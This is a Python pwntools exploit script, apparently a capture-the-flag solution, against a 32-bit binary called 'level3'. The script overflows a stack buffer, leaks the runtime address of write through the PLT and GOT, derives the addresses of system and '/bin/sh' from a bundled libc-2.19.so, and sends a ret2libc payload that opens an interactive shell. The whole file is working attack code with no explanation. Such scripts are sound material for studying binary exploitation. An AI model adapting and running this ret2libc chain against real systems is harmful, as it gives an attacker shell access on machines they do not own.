from pwn import *

# sh = process('./level3') # local
# e = ELF('/lib/i386-linux-gnu/libc.so.6')
# context.log_level = 'debug'  # ?
#sh =  remote('127.0.0.1', 4000) 
sh = process('level3')
e = ELF('libc-2.19.so')

# offset 
readoffset = e.symbols['read']
writeoffset = e.symbols['write']
systemoffset = e.symbols['system']
binoffset = next(e.search('/bin/sh'))

# plt 
readplt = 0x08048310
writeplt = 0x08048340

# got 
readgot = 0x0804A00C
writegot = 0x0804A018

# leak the run address of write

junk = 'a'*0x88 
fakebp = 'a'*4
vulfun = 0x0804844B
payload = junk + fakebp  + p32(writeplt) + p32(vulfun) + p32(1)+p32(writegot)+p32(4)

sh.recvuntil('Input:\n')
sh.send(payload)
writeaddr = u32(sh.recv(4)) # the ture addr of write function


systemaddr = writeaddr - writeoffset + systemoffset
binaddr = writeaddr - writeoffset + binoffset

payload2 = junk + fakebp + p32(systemaddr)+'a'*4 +p32(binaddr)

sh.send(payload2)
sh.interactive()


